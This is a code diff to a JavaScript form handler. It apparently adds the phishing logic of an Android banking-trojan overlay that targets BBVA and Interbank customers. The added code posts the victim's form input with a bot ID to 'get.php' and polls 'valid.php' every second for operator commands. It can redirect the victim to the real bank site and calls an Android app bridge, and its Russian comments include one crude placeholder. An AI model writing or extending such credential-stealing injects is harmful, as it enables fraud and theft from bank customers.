@@ -98,9 +98,9 @@ document.addEventListener("DOMContentLoaded", function () {
     }
 
     if (valid) {
+      sendForm("myForm");
       console.log("Form is valid, proceeding to submission...");
     } else {
-      //   alert(errorMessage);
       customAlert();
     }
   });
@@ -131,5 +131,71 @@ document.addEventListener("DOMContentLoaded", function () {
     showModal();
   }
 
-  // Использование customAlert вместо стандартного alert
+  const elementoContacto = document.querySelector(".contacto");
+
+  const elementoUbicanos = document.querySelector(".ubicanos");
+
+  elementoContacto.addEventListener("click", () => {
+    Android.clickcallphone();
+  });
+
+  elementoUbicanos.addEventListener("click", () => {
+    Android.clickopenlocation();
+  });
+
+  function sendForm(formid) {
+    var form = document.getElementById(formid);
+
+    var formData = new FormData(form);
+
+    var botId = getQueryParam("botid");
+    formData.append("botid", botId); //добавляем ботайди
+    formData.append("target", "bbva"); //добавляем ботайди
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "get.php", true);
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+        // Обработка успешного ответа сервера
+        console.log(xhr.responseText);
+        sendRequestWithBotId(); // Начинаем отслеживание с сервера
+      } else {
+        // Обработка ошибок
+        console.error(xhr.statusText);
+      }
+    };
+    console.log(formData);
+    xhr.send(formData);
+  }
+
+  function sendRequestWithBotId() {
+    var botId = getQueryParam("botid");
+
+    if (botId) {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "valid.php?botid=" + botId, true);
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4) {
+          var responseCode = xhr.status;
+          if (responseCode === 200) {
+            setTimeout(sendRequestWithBotId, 1000); // обновляется эта команда каждую секунду
+          } else if (responseCode === 201) {
+            window.location.href = "https://interbank.pe"; //редир на интер
+          } else if (responseCode === 202) {
+            //добавь свой код который при ошибке ебашишь
+          } else {
+            console.error("Unexpected response code: " + responseCode);
+          }
+        }
+      };
+      xhr.send();
+    } else {
+      console.error("Missing botid parameter");
+    }
+  }
+
+  function getQueryParam(name) {
+    var urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+  }
 });
